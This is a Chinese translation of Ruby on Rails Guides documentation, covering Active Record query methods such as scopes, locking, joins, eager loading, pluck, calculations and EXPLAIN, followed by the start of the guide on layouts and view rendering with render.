如果查询中没有使用 ORDER 子句，reverse_order 方法会按照主键的逆序查询：
Client.where("orders_count > 10").reverse_order

执行的 SQL 语句如下：
SELECT * FROM clients WHERE orders_count > 10 ORDER BY clients.id DESC

这个方法没有参数。
###  8.5 rewhere

rewhere 方法覆盖前面的 where 条件。例如：
Post.where(trashed: true).rewhere(trashed: false)

执行的 SQL 语句如下：
SELECT * FROM posts WHERE `trashed` = 0

如果不使用 rewhere 方法，写成：
Post.where(trashed: true).where(trashed: false)

执行的 SQL 语句如下：
SELECT * FROM posts WHERE `trashed` = 1 AND `trashed` = 0


##  9 空关系

none 返回一个可链接的关系，没有相应的记录。none 方法返回对象的后续条件查询，得到的还是空关系。如果想以可链接的方式响应可能无返回结果的方法或者作用域，可使用 none 方法。
Post.none # returns an empty Relation and fires no queries.
# The visible_posts method below is expected to return a Relation.
@posts = current_user.visible_posts.where(name: params[:name])
 
def visible_posts
  case role
  when 'Country Manager'
    Post.where(country: country)
  when 'Reviewer'
    Post.published
  when 'Bad User'
    Post.none # => returning [] or nil breaks the caller code in this case
  end
end

##  10 只读对象

Active Record 提供了 readonly 方法，禁止修改获取的对象。试图修改只读记录的操作不会成功，而且会抛出 ActiveRecord::ReadOnlyRecord 异常。
client = Client.readonly.first
client.visits += 1
client.save

因为把 client 设为了只读对象，所以上述代码调用 client.save 方法修改 visits 的值时会抛出 ActiveRecord::ReadOnlyRecord 异常。

##  11 更新时锁定记录

锁定可以避免更新记录时的条件竞争，也能保证原子更新。

Active Record 提供了两种锁定机制：

    乐观锁定
    悲观锁定

###  11.1 乐观锁定

乐观锁定允许多个用户编辑同一个记录，假设数据发生冲突的可能性最小。Rails 会检查读取记录后是否有其他程序在修改这个记录。如果检测到有其他程序在修改，就会抛出 ActiveRecord::StaleObjectError 异常，忽略改动。

乐观锁定字段

为了使用乐观锁定，数据表中要有一个类型为整数的 lock_version 字段。每次更新记录时，Active Record 都会增加 lock_version 字段的值。如果更新请求中的 lock_version 字段值比数据库中的 lock_version 字段值小，会抛出 ActiveRecord::StaleObjectError 异常，更新失败。例如：
c1 = Client.find(1)
c2 = Client.find(1)
 
c1.first_name = "Michael"
c1.save
 
c2.name = "should fail"
c2.save # Raises an ActiveRecord::StaleObjectError

抛出异常后，你要负责处理冲突，可以回滚操作、合并操作或者使用其他业务逻辑处理。

乐观锁定可以使用 ActiveRecord::Base.lock_optimistically = false 关闭。

要想修改 lock_version 字段的名字，可以使用 ActiveRecord::Base 提供的 locking_column 类方法：
class Client < ActiveRecord::Base
  self.locking_column = :lock_client_column
end

###  11.2 悲观锁定

悲观锁定使用底层数据库提供的锁定机制。使用 lock 方法构建的关系在所选记录上生成一个“互斥锁”（exclusive lock）。使用 lock 方法构建的关系一般都放入事务中，避免死锁。

例如：
Item.transaction do
  i = Item.lock.first
  i.name = 'Jones'
  i.save
end

在 MySQL 中，上述代码生成的 SQL 如下：
SQL (0.2ms)   BEGIN
Item Load (0.3ms)   SELECT * FROM `items` LIMIT 1 FOR UPDATE
Item Update (0.4ms)   UPDATE `items` SET `updated_at` = '2009-02-07 18:05:56', `name` = 'Jones' WHERE `id` = 1
SQL (0.8ms)   COMMIT

lock 方法还可以接受 SQL 语句，使用其他锁定类型。例如，MySQL 中有一个语句是 LOCK IN SHARE MODE，会锁定记录，但还是允许其他查询读取记录。要想使用这个语句，直接传入 lock 方法即可：
Item.transaction do
  i = Item.lock("LOCK IN SHARE MODE").find(1)
  i.increment!(:views)
end

如果已经创建了模型实例，可以在事务中加上这种锁定，如下所示：
item = Item.first
item.with_lock do
  # This block is called within a transaction,
  # item is already locked.
  item.increment!(:views)
end


##  12 连接数据表

Active Record 提供了一个查询方法名为 joins，用来指定 SQL JOIN 子句。joins 方法的用法有很多种。
###  12.1 使用字符串形式的 SQL 语句

在 joins 方法中可以直接使用 JOIN 子句的 SQL：
Client.joins('LEFT OUTER JOIN addresses ON addresses.client_id = clients.id')

生成的 SQL 语句如下：
SELECT clients.* FROM clients LEFT OUTER JOIN addresses ON addresses.client_id = clients.id
###  12.2 使用数组或 Hash 指定具名关联

这种方法只用于 INNER JOIN。

使用 joins 方法时，可以使用声明关联时使用的关联名指定 JOIN 子句。

例如，假如按照如下方式定义 Category、Post、Comment、Guest 和 Tag 模型：
class Category < ActiveRecord::Base
  has_many :posts
end
 
class Post < ActiveRecord::Base
  belongs_to :category
  has_many :comments
  has_many :tags
end
 
class Comment < ActiveRecord::Base
  belongs_to :post
  has_one :guest
end
 
class Guest < ActiveRecord::Base
  belongs_to :comment
end
 
class Tag < ActiveRecord::Base
  belongs_to :post
end

下面各种用法能都使用 INNER JOIN 子句生成正确的连接查询：

####  12.2.1 连接单个关联
Category.joins(:posts)

生成的 SQL 语句如下：
SELECT categories.* FROM categories
  INNER JOIN posts ON posts.category_id = categories.id

用人类语言表达，上述查询的意思是，“使用文章的分类创建分类对象”。注意，分类对象可能有重复，因为多篇文章可能属于同一分类。如果不想出现重复，可使用 Category.joins(:posts).uniq 方法。

####  12.2.2 连接多个关联
Post.joins(:category, :comments)

生成的 SQL 语句如下：
SELECT posts.* FROM posts
  INNER JOIN categories ON posts.category_id = categories.id
  INNER JOIN comments ON comments.post_id = posts.id

用人类语言表达，上述查询的意思是，“返回指定分类且至少有一个评论的所有文章”。注意，如果文章有多个评论，同个文章对象会出现多次。

####  12.2.3 连接一层嵌套关联
Post.joins(comments: :guest)

生成的 SQL 语句如下：
SELECT posts.* FROM posts
  INNER JOIN comments ON comments.post_id = posts.id
  INNER JOIN guests ON guests.comment_id = comments.id

用人类语言表达，上述查询的意思是，“返回有一个游客发布评论的所有文章”。

####  12.2.4 连接多层嵌套关联
Category.joins(posts: [{ comments: :guest }, :tags])

生成的 SQL 语句如下：
SELECT categories.* FROM categories
  INNER JOIN posts ON posts.category_id = categories.id
  INNER JOIN comments ON comments.post_id = posts.id
  INNER JOIN guests ON guests.comment_id = comments.id
  INNER JOIN tags ON tags.post_id = posts.id

###  12.3 指定用于连接数据表上的条件

作用在连接数据表上的条件可以使用数组和字符串指定。[Hash 形式的条件]((#hash-conditions)使用的句法有点特殊：
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Client.joins(:orders).where('orders.created_at' => time_range)

还有一种更简洁的句法是使用嵌套 Hash：
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Client.joins(:orders).where(orders: { created_at: time_range })

上述查询会获取昨天下订单的所有客户对象，再次用到了 SQL BETWEEN 语句。


##  13 按需加载关联

使用 Model.find 方法获取对象的关联记录时，按需加载机制会使用尽量少的查询次数。

####  N + 1 查询问题

假设有如下的代码，获取 10 个客户对象，并把客户的邮编打印出来
clients = Client.limit(10)
 
clients.each do |client|
  puts client.address.postcode
end

上述代码初看起来很好，但问题在于查询的总次数。上述代码总共会执行 1（获取 10 个客户记录）+ 10（分别获取 10 个客户的地址）= 11 次查询。

####  N + 1 查询的解决办法

在 Active Record 中可以进一步指定要加载的所有关联，调用 Model.find 方法是使用 includes 方法实现。使用 includes 后，Active Record 会使用尽可能少的查询次数加载所有指定的关联。

我们可以使用按需加载机制加载客户的地址，把 Client.limit(10) 改写成：
clients = Client.includes(:address).limit(10)
 
clients.each do |client|
  puts client.address.postcode
end

和前面的 11 次查询不同，上述代码只会执行 2 次查询：
SELECT * FROM clients LIMIT 10
SELECT addresses.* FROM addresses
  WHERE (addresses.client_id IN (1,2,3,4,5,6,7,8,9,10))

###  13.1 按需加载多个关联

调用 Model.find 方法时，使用 includes 方法可以一次加载任意数量的关联，加载的关联可以通过数组、Hash、嵌套 Hash 指定。
####  13.1.1 用数组指定多个关联
Post.includes(:category, :comments)

上述代码会加载所有文章，以及和每篇文章关联的分类和评论。
####  13.1.2 使用 Hash 指定嵌套关联
Category.includes(posts: [{ comments: :guest }, :tags]).find(1)

上述代码会获取 ID 为 1 的分类，按需加载所有关联的文章，文章的标签和评论，以及每个评论的 guest 关联。

###  13.2 指定用于按需加载关联上的条件

虽然 Active Record 允许使用 joins 方法指定用于按需加载关联上的条件，但是推荐的做法是使用连接数据表。

如果非要这么做，可以按照常规方式使用 where 方法。
Post.includes(:comments).where("comments.visible" => true)

上述代码生成的查询中会包含 LEFT OUTER JOIN 子句，而 joins 方法生成的查询使用的是 INNER JOIN 子句。
SELECT "posts"."id" AS t0_r0, ... "comments"."updated_at" AS t1_r5 FROM "posts" LEFT OUTER JOIN "comments" ON "comments"."post_id" = "posts"."id" WHERE (comments.visible = 1)

如果没指定 where 条件，上述代码会生成两个查询语句。

如果像上面的代码一样使用 includes，即使所有文章都没有评论，也会加载所有文章。使用 joins 方法（INNER JOIN）时，必须满足连接条件，否则不会得到任何记录。


##  14 作用域

###  作用域的概念
作用域把常用的查询定义成方法，在关联对象或模型上调用。在作用域中可以使用前面介绍的所有方法，例如 where、joins 和 includes。所有作用域方法都会返回一个 ActiveRecord::Relation 对象，允许继续调用其他方法（例如另一个作用域方法）。

要想定义简单的作用域，可在类中调用 scope 方法，传入执行作用域时运行的代码：
class Post < ActiveRecord::Base
  scope :published, -> { where(published: true) }
end

上述方式和直接定义类方法的作用一样，使用哪种方式只是个人喜好：
class Post < ActiveRecord::Base
  def self.published
    where(published: true)
  end
end

作用域可以链在一起调用：
class Post < ActiveRecord::Base
  scope :published,               -> { where(published: true) }
  scope :published_and_commented, -> { published.where("comments_count > 0") }
end

可以在模型类上调用 published 作用域：
Post.published # => [published posts]

也可以在包含 Post 对象的关联上调用：
category = Category.first
category.posts.published # => [published posts belonging to this category]
###  14.1 传入参数

作用域可接受参数：
class Post < ActiveRecord::Base
  scope :created_before, ->(time) { where("created_at < ?", time) }
end

作用域的调用方法和类方法一样：
Post.created_before(Time.zone.now)

不过这就和类方法的作用一样了。
class Post < ActiveRecord::Base
  def self.created_before(time)
    where("created_at < ?", time)
  end
end

如果作用域要接受参数，推荐直接使用类方法。有参数的作用域也可在关联对象上调用：
category.posts.created_before(time)

###  14.2 合并作用域

和 where 方法一样，作用域也可通过 AND 合并查询条件：
class User < ActiveRecord::Base
  scope :active, -> { where state: 'active' }
  scope :inactive, -> { where state: 'inactive' }
end
 
User.active.inactive
# SELECT "users".* FROM "users" WHERE "users"."state" = 'active' AND "users"."state" = 'inactive'

作用域还可以 where 一起使用，生成的 SQL 语句会使用 AND 连接所有条件。
User.active.where(state: 'finished')
# SELECT "users".* FROM "users" WHERE "users"."state" = 'active' AND "users"."state" = 'finished'

如果不想让最后一个 WHERE 子句获得优先权，可以使用 Relation#merge 方法。
User.active.merge(User.inactive)
# SELECT "users".* FROM "users" WHERE "users"."state" = 'inactive'

使用作用域时要注意，default_scope 会添加到作用域和 where 方法指定的条件之前。
class User < ActiveRecord::Base
  default_scope { where state: 'pending' }
  scope :active, -> { where state: 'active' }
  scope :inactive, -> { where state: 'inactive' }
end
 
User.all
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending'
 
User.active
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'active'
 
User.where(state: 'inactive')
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'inactive'

如上所示，default_scope 中的条件添加到了 active 和 where 之前。

###  14.3 指定默认作用域

如果某个作用域要用在模型的所有查询中，可以在模型中使用 default_scope 方法指定。
class Client < ActiveRecord::Base
  default_scope { where("removed_at IS NULL") }
end

执行查询时使用的 SQL 语句如下：
SELECT * FROM clients WHERE removed_at IS NULL

如果默认作用域中的条件比较复杂，可以使用类方法的形式定义：
class Client < ActiveRecord::Base
  def self.default_scope
    # Should return an ActiveRecord::Relation.
  end
end

###  14.4 删除所有作用域

如果基于某些原因想删除作用域，可以使用 unscoped 方法。如果模型中定义了 default_scope，而在这个作用域中不需要使用，就可以使用 unscoped 方法。
Client.unscoped.load

unscoped 方法会删除所有作用域，在数据表中执行常规查询。

注意，不能在作用域后链式调用 unscoped，这时可以使用代码块形式的 unscoped 方法：
Client.unscoped {
  Client.created_before(Time.zone.now)
}


##  15 动态查询方法

Active Record 为数据表中的每个字段都提供了一个查询方法。例如，在 Client 模型中有个 first_name 字段，那么 Active Record 就会生成 find_by_first_name 方法。如果在 Client 模型中有个 locked 字段，就有一个 find_by_locked 方法。

在这些动态生成的查询方法后，可以加上感叹号（!），例如 Client.find_by_name!("Ryan")。此时，如果找不到记录就会抛出 ActiveRecord::RecordNotFound 异常。

如果想同时查询 first_name 和 locked 字段，可以用 and 把两个字段连接起来，获得所需的查询方法，例如 Client.find_by_first_name_and_locked("Ryan", true)。

##  16 查找或构建新对象

某些动态查询方法在 Rails 4.0 中已经启用，会在 Rails 4.1 中删除。推荐的做法是使用 Active Record 作用域。废弃的方法可以在这个 gem 中查看：https://github.com/rails/activerecord-deprecated_finders。

我们经常需要在查询不到记录时创建一个新记录。这种需求可以使用 find_or_create_by 或 find_or_create_by! 方法实现。
###  16.1 find_or_create_by

find_or_create_by 方法首先检查指定属性对应的记录是否存在，如果不存在就调用 create 方法。我们来看一个例子。

假设你想查找一个名为“Andy”的客户，如果这个客户不存在就新建。这个需求可以使用下面的代码完成：
Client.find_or_create_by(first_name: 'Andy')
# => #<Client id: 1, first_name: "Andy", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">

上述方法生成的 SQL 语句如下：
SELECT * FROM clients WHERE (clients.first_name = 'Andy') LIMIT 1
BEGIN
INSERT INTO clients (created_at, first_name, locked, orders_count, updated_at) VALUES ('2011-08-30 05:22:57', 'Andy', 1, NULL, '2011-08-30 05:22:57')
COMMIT

find_or_create_by 方法返回现有的记录或者新建的记录。在上面的例子中，名为“Andy”的客户不存在，所以会新建一个记录，然后将其返回。

新纪录可能没有存入数据库，这取决于是否能通过数据验证（就像 create 方法一样）。

假设创建新记录时，要把 locked 属性设为 false，但不想在查询中设置。例如，我们要查询一个名为“Andy”的客户，如果这个客户不存在就新建一个，而且 locked 属性为 false。

这种需求有两种实现方法。第一种，使用 create_with 方法：
Client.create_with(locked: false).find_or_create_by(first_name: 'Andy')

第二种，使用代码块：
Client.find_or_create_by(first_name: 'Andy') do |c|
  c.locked = false
end

代码块中的代码只会在创建客户之后执行。再次运行这段代码时，会忽略代码块中的代码。
###  16.2 find_or_create_by!

还可使用 find_or_create_by! 方法，如果新纪录不合法，会抛出异常。本文不涉及数据验证，假设已经在 Client 模型中定义了下面的验证：
validates :orders_count, presence: true

如果创建新 Client 对象时没有指定 orders_count 属性的值，这个对象就是不合法的，会抛出以下异常：
Client.find_or_create_by!(first_name: 'Andy')
# => ActiveRecord::RecordInvalid: Validation failed: Orders count can't be blank

###  16.3 find_or_initialize_by

find_or_initialize_by 方法和 find_or_create_by 的作用差不多，但不调用 create 方法，而是 new 方法。也就是说新建的模型实例在内存中，没有存入数据库。继续使用前面的例子，现在我们要查询的客户名为“Nick”：
nick = Client.find_or_initialize_by(first_name: 'Nick')
# => <Client id: nil, first_name: "Nick", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">
 
nick.persisted?
# => false
 
nick.new_record?
# => true

因为对象不会存入数据库，上述代码生成的 SQL 语句如下：
SELECT * FROM clients WHERE (clients.first_name = 'Nick') LIMIT 1

如果想把对象存入数据库，调用 save 方法即可：
nick.save
# => true


##  17 使用 SQL 语句查询

如果想使用 SQL 语句查询数据表中的记录，可以使用 find_by_sql 方法。就算只找到一个记录，find_by_sql 方法也会返回一个由记录组成的数组。例如，可以运行下面的查询：
Client.find_by_sql("SELECT * FROM clients
  INNER JOIN orders ON clients.id = orders.client_id
  ORDER BY clients.created_at desc")

find_by_sql 方法提供了一种定制查询的简单方式。
###  17.1 select_all

find_by_sql 方法有一个近亲，名为 connection#select_all。和 find_by_sql 一样，select_all 方法会使用 SQL 语句查询数据库，获取记录，但不会初始化对象。select_all 返回的结果是一个由 Hash 组成的数组，每个 Hash 表示一个记录。
Client.connection.select_all("SELECT * FROM clients WHERE id = '1'")

###  17.2 pluck

pluck 方法可以在模型对应的数据表中查询一个或多个字段，其参数是一组字段名，返回结果是由各字段的值组成的数组。
Client.where(active: true).pluck(:id)
# SELECT id FROM clients WHERE active = 1
# => [1, 2, 3]
 
Client.distinct.pluck(:role)
# SELECT DISTINCT role FROM clients
# => ['admin', 'member', 'guest']
 
Client.pluck(:id, :name)
# SELECT clients.id, clients.name FROM clients
# => [[1, 'David'], [2, 'Jeremy'], [3, 'Jose']]

如下的代码：
Client.select(:id).map { |c| c.id }
# or
Client.select(:id).map(&:id)
# or
Client.select(:id, :name).map { |c| [c.id, c.name] }

可用 pluck 方法实现：
Client.pluck(:id)
# or
Client.pluck(:id, :name)

和 select 方法不一样，pluck 直接把查询结果转换成 Ruby 数组，不生成 Active Record 对象，可以提升大型查询或常用查询的执行效率。但 pluck 方法不会使用重新定义的属性方法处理查询结果。例如：
class Client < ActiveRecord::Base
  def name
    "I am #{super}"
  end
end
 
Client.select(:name).map &:name
# => ["I am David", "I am Jeremy", "I am Jose"]
 
Client.pluck(:name)
# => ["David", "Jeremy", "Jose"]

而且，与 select 和其他 Relation 作用域不同的是，pluck 方法会直接执行查询，因此后面不能和其他作用域链在一起，但是可以链接到已经执行的作用域之后：
Client.pluck(:name).limit(1)
# => NoMethodError: undefined method `limit' for #<Array:0x007ff34d3ad6d8>
 
Client.limit(1).pluck(:name)
# => ["David"]
###  17.3 ids

ids 方法可以直接获取数据表的主键。
Person.ids
# SELECT id FROM people
class Person < ActiveRecord::Base
  self.primary_key = "person_id"
end
 
Person.ids
# SELECT person_id FROM people


##  18 检查对象是否存在

如果只想检查对象是否存在，可以使用 exists? 方法。这个方法使用的数据库查询和 find 方法一样，但不会返回对象或对象集合，而是返回 true 或 false。
Client.exists?(1)

exists? 方法可以接受多个值，但只要其中一个记录存在，就会返回 true。
Client.exists?(id: [1,2,3])
# or
Client.exists?(name: ['John', 'Sergei'])

在模型或关系上调用 exists? 方法时，可以不指定任何参数。
Client.where(first_name: 'Ryan').exists?

在上述代码中，只要有一个客户的 first_name 字段值为 'Ryan'，就会返回 true，否则返回 false。
Client.exists?

在上述代码中，如果 clients 表是空的，会返回 false，否则返回 true。

在模型或关系中检查存在性时还可使用 any? 和 many? 方法。
# via a model
Post.any?
Post.many?
 
# via a named scope
Post.recent.any?
Post.recent.many?
 
# via a relation
Post.where(published: true).any?
Post.where(published: true).many?
 
# via an association
Post.first.categories.any?
Post.first.categories.many?

##  19 计算

### 示例
这里先以 count 方法为例，所有的选项都可在后面各方法中使用。

所有计算型方法都可直接在模型上调用：
Client.count
# SELECT count(*) AS count_all FROM clients

或者在关系上调用：
Client.where(first_name: 'Ryan').count
# SELECT count(*) AS count_all FROM clients WHERE (first_name = 'Ryan')

执行复杂计算时还可使用各种查询方法：
Client.includes("orders").where(first_name: 'Ryan', orders: { status: 'received' }).count

上述代码执行的 SQL 语句如下：
SELECT count(DISTINCT clients.id) AS count_all FROM clients
  LEFT OUTER JOIN orders ON orders.client_id = client.id WHERE
  (clients.first_name = 'Ryan' AND orders.status = 'received')

###  19.1 计数

如果想知道模型对应的数据表中有多少条记录，可以使用 Client.count 方法。如果想更精确的计算设定了 age 字段的记录数，可以使用 Client.count(:age)。

count 方法可用的选项如前所述。

###  19.2 平均值

如果想查看某个字段的平均值，可以使用 average 方法。用法如下：
Client.average("orders_count")

这个方法会返回指定字段的平均值，得到的有可能是浮点数，例如 3.14159265。

average 方法可用的选项如前所述。
###  19.3 最小值

如果想查看某个字段的最小值，可以使用 minimum 方法。用法如下：
Client.minimum("age")

minimum 方法可用的选项如前所述。

###  19.4 最大值

如果想查看某个字段的最大值，可以使用 maximum 方法。用法如下：
Client.maximum("age")

maximum 方法可用的选项如前所述。
###  19.5 求和

如果想查看所有记录中某个字段的总值，可以使用 sum 方法。用法如下：
Client.sum("orders_count")

sum 方法可用的选项如前所述。


##  20 执行 EXPLAIN 命令

可以在关系执行的查询中执行 EXPLAIN 命令。例如：
User.where(id: 1).joins(:posts).explain

在 MySQL 中得到的输出如下：
EXPLAIN for: SELECT `users`.* FROM `users` INNER JOIN `posts` ON `posts`.`user_id` = `users`.`id` WHERE `users`.`id` = 1
+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------------+
| id | select_type | table | type  | possible_keys | key     | key_len | ref   | rows | Extra       |
+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------------+
|  1 | SIMPLE      | users | const | PRIMARY       | PRIMARY | 4       | const |    1 |             |
|  1 | SIMPLE      | posts | ALL   | NULL          | NULL    | NULL    | NULL  |    1 | Using where |
+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------------+
2 rows in set (0.00 sec)

Active Record 会按照所用数据库 shell 的方式输出结果。所以，相同的查询在 PostgreSQL 中得到的输出如下：
EXPLAIN for: SELECT "users".* FROM "users" INNER JOIN "posts" ON "posts"."user_id" = "users"."id" WHERE "users"."id" = 1
                                  QUERY PLAN
------------------------------------------------------------------------------
 Nested Loop Left Join  (cost=0.00..37.24 rows=8 width=0)
   Join Filter: (posts.user_id = users.id)
   ->  Index Scan using users_pkey on users  (cost=0.00..8.27 rows=1 width=4)
         Index Cond: (id = 1)
   ->  Seq Scan on posts  (cost=0.00..28.88 rows=8 width=4)
         Filter: (posts.user_id = 1)
(6 rows)

按需加载会触发多次查询，而且有些查询要用到之前查询的结果。鉴于此，explain 方法会真正执行查询，然后询问查询计划。例如：
User.where(id: 1).includes(:posts).explain

在 MySQL 中得到的输出如下：
EXPLAIN for: SELECT `users`.* FROM `users`  WHERE `users`.`id` = 1
+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------+
| id | select_type | table | type  | possible_keys | key     | key_len | ref   | rows | Extra |
+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------+
|  1 | SIMPLE      | users | const | PRIMARY       | PRIMARY | 4       | const |    1 |       |
+----+-------------+-------+-------+---------------+---------+---------+-------+------+-------+
1 row in set (0.00 sec)
 
EXPLAIN for: SELECT `posts`.* FROM `posts`  WHERE `posts`.`user_id` IN (1)
+----+-------------+-------+------+---------------+------+---------+------+------+-------------+
| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows | Extra       |
+----+-------------+-------+------+---------------+------+---------+------+------+-------------+
|  1 | SIMPLE      | posts | ALL  | NULL          | NULL | NULL    | NULL |    1 | Using where |
+----+-------------+-------+------+---------------+------+---------+------+------+-------------+
1 row in set (0.00 sec)
###  20.1 解读 EXPLAIN 命令的输出结果

解读 EXPLAIN 命令的输出结果不在本文的范畴之内。下面列出的链接可以帮助你进一步了解相关知识：

    SQLite3: EXPLAIN QUERY PLAN
    MySQL: EXPLAIN 的输出格式
    PostgreSQL: 使用 EXPLAIN

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Rails 布局和视图渲染

本文介绍 Action Controller 和 Action View 中布局的基本功能。

读完本文，你将学到：

    如何使用 Rails 内建的各种渲染方法；
    如果创建具有多个内容区域的布局；
    如何使用局部视图去除重复；
    如何使用嵌套布局（子模板）；

Chapters

    概览：各组件之间的协作
    创建响应
        渲染视图
        使用 render 方法
        使用 redirect_to 方法
        使用 head 构建只返回报头的响应
    布局结构
        静态资源标签帮助方法
        理解 yield
        使用 content_for 方法
        使用局部视图
        使用嵌套布局

##  1 概览：各组件之间的协作

本文关注 MVC 架构中控制器和视图之间的交互。你可能已经知道，控制器的作用是处理请求，但经常会把繁重的操作交给模型完成。返回响应时，控制器会把一些操作交给视图完成。本文要说明的就是控制器交给视图的操作是怎么完成的。

总的来说，这个过程涉及到响应中要发送什么内容，以及调用哪个方法创建响应。如果响应是个完整的视图，Rails 还要做些额外工作，把视图套入布局，有时还要渲染局部视图。后文会详细介绍整个过程。

##  2 创建响应

从控制器的角度来看，创建 HTTP 响应有三种方法：

    调用 render 方法，向浏览器发送一个完整的响应；
    调用 redirect_to 方法，向浏览器发送一个 HTTP 重定向状态码；
    调用 head 方法，向浏览器发送只含报头的响应；

###  2.1 渲染视图

你可能已经听说过 Rails 的开发原则之一是“多约定，少配置”。默认渲染视图的处理就是这一原则的完美体现。默认情况下，Rails 中的控制器会渲染路由对应的视图。例如，有如下的 BooksController 代码：
class BooksController < ApplicationController
end

在路由文件中有如下定义：
resources :books

而且有个名为 app/views/books/index.html.erb 的视图文件：
<h1>Books are coming soon!</h1>

那么，访问 /books 时，Rails 会自动渲染视图 app/views/books/index.html.erb，网页中会看到显示有“Books are coming soon!”。

网页中显示这些文字没什么用，所以后续你可能会创建一个 Book 模型，然后在 BooksController 中添加 index 动作：
class BooksController < ApplicationController
  def index
    @books = Book.all
  end
end

注意，基于“多约定，少配置”原则，在 index 动作末尾并没有指定要渲染视图，Rails 会自动在控制器的视图文件夹中寻找 action_name.html.erb 模板，然后渲染。在这个例子中，Rails 渲染的是 app/views/books/index.html.erb 文件。

如果要在视图中显示书籍的属性，可以使用 ERB 模板：
<h1>Listing Books</h1>
 
<table>
  <tr>
    <th>Title</th>
    <th>Summary</th>
    <th></th>
    <th></th>
    <th></th>
  </tr>
 
<% @books.each do |book| %>
  <tr>
    <td><%= book.title %></td>
    <td><%= book.content %></td>
    <td><%= link_to "Show", book %></td>
    <td><%= link_to "Edit", edit_book_path(book) %></td>
    <td><%= link_to "Remove", book, method: :delete, data: { confirm: "Are you sure?" } %></td>
  </tr>
<% end %>
</table>
 
<br>
 
<%= link_to "New book", new_book_path %>

真正处理渲染过程的是 ActionView::TemplateHandlers 的子类。本文不做深入说明，但要知道，文件的扩展名决定了要使用哪个模板处理程序。从 Rails 2 开始，ERB 模板（含有嵌入式 Ruby 代码的 HTML）的标准扩展名是 .erb，Builder 模板（XML 生成器）的标准扩展名是 .builder。

###  2.2 使用 render 方法

大多数情况下，ActionController::Base#render 方法都能满足需求，而且还有多种定制方式，可以渲染 Rails 模板的默认视图、指定的模板、文件、行间代码或者什么也不渲染。渲染的内容格式可以是文本，JSON 或 XML。而且还可以设置响应的内容类型和 HTTP 状态码。

如果不想使用浏览器直接查看调用 render 方法得到的结果，可以使用 render_to_string 方法。render_to_string 和 render 的用法完全一样，不过不会把响应发送给浏览器，而是直接返回字符串。

####  2.2.1 什么都不渲染

或许 render 方法最简单的用法是什么也不渲染：
render nothing: true

如果使用 cURL 查看请求，会得到一些输出：
$ curl -i 127.0.0.1:3000/books
HTTP/1.1 200 OK
Connection: close
Date: Sun, 24 Jan 2010 09:25:18 GMT
Transfer-Encoding: chunked
Content-Type: */*; charset=utf-8
X-Runtime: 0.014297
Set-Cookie: _blog_session=...snip...; path=/; HttpOnly
Cache-Control: no-cache
 
$

可以看到，响应的主体是空的（Cache-Control 之后没有数据），但请求本身是成功的，因为 Rails 把响应码设为了“200 OK”。调用 render 方法时可以设置 :status 选项修改状态码。这种用法可在 Ajax 请求中使用，因为此时只需告知浏览器请求已经完成。

或许不应该使用 render :nothing，而要用后面介绍的 head 方法。head 方法用起来更灵活，而且只返回 HTTP 报头。

####  2.2.2 渲染动作的视图

如果想渲染同个控制器中的其他模板，可以把视图的名字传递给 render 方法：
def update
  @book = Book.find(params[:id])
  if @book.update(book_params)
    redirect_to(@book)
  else
    render "edit"
  end
end

如果更新失败，会渲染同个控制器中的 edit.html.erb 模板。

如果不想用字符串，还可使用 Symbol 指定要渲染的动作：
def update
  @book = Book.find(params[:id])
  if @book.update(book_params)
    redirect_to(@book)
  else
    render :edit
  end
end

####  2.2.3 渲染其他控制器中的动作模板

如果想渲染其他控制器中的模板该怎么做呢？还是使用 render 方法，指定模板的完整路径即可。例如，如果控制器 AdminProductsController 在 app/controllers/admin 文件夹中，可使用下面的方式渲染 app/views/products 文件夹中的模板：
render "products/show"

因为参数中有个斜线，所以 Rails 知道这个视图属于另一个控制器。如果想让代码的意图更明显，可以使用 :template 选项（Rails 2.2+ 必须这么做）：
render template: "products/show"

####  2.2.4 渲染任意文件

render 方法还可渲染程序之外的视图（或许多个程序共用一套视图）：
render "/u/apps/warehouse_app/current/app/views/products/show"

因为参数以斜线开头，所以 Rails 将其视为一个文件。如果想让代码的意图更明显，可以使用 :file 选项（Rails 2.2+ 必须这么做）
render file: "/u/apps/warehouse_app/current/app/views/products/show"

:file 选项的值是文件系统中的绝对路径。当然，你要对使用的文件拥有相应权限。

默认情况下，渲染文件时不会使用当前程序的布局。如果想让 Rails 把文件套入布局，要指定 layout: true 选项。

如果在 Windows 中运行 Rails，就必须使用 :file 选项指定文件的路径，因为 Windows 中的文件名和 Unix 格式不一样。

####  2.2.5 小结

上述三种渲染方式的作用其实是一样的。在 BooksController 控制器的 update 动作中，如果更新失败后想渲染 views/books 文件夹中的 edit.html.erb 模板，下面这些用法都能达到这个目的：
render :edit
render action: :edit
render "edit"
render "edit.html.erb"
render action: "edit"
render action: "edit.html.erb"
render "books/edit"
render "books/edit.html.erb"
render template: "books/edit"
render template: "books/edit.html.erb"
render "/path/to/rails/app/views/books/edit"
render "/path/to/rails/app/views/books/edit.html.erb"
render file: "/path/to/rails/app/views/books/edit"
render file: "/path/to/rails/app/views/books/edit.html.erb"

你可以根据自己的喜好决定使用哪种方式，总的原则是，使用符合代码意图的最简单方式。

####  2.2.6 使用 render 方法的 :inline 选项

